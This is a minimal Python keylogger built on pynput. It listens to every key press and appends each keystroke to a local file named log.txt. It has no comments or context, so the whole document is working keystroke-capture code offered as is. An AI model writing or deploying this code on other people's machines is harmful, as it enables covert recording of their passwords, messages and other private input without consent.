from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as file:
        file.write(f"{key}\n")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()